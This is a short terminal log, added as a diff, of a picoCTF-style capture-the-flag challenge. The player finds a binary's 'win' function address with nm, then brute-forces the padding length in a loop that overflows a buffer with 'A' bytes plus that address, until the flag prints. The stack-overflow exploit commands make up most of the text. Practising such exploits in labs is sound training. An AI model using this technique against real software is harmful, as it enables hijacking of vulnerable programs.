@@ -1,0 +1,15 @@
+ctf-player@pico-chall$ ./start
+[+] Selected file: 16.c
+[+] Copied 16.c to current directory.
+[+] Compilation successful: 16
+[+] Binary 16 has access to flag.txt
+[*] Deletion scheduled: files will be removed in 120 seconds (even if this script exits).
+ctf-player@pico-chall$ nm 16 | grep ' win$'
+080491f6 T win
+ctf-player@pico-chall$ for i in $(seq 0 140); do
+>   python3 -c "import sys; sys.stdout.buffer.write(b'A'*$i + b'\xf6\x91\x04\x08')" | ./16 | grep picoCTF && break
+> done
+
+picoCTF{u_Us3d_pwNt00L5_f1d96c5f}
+ctf-player@pico-chall$
+ctf-player@pico-chall$
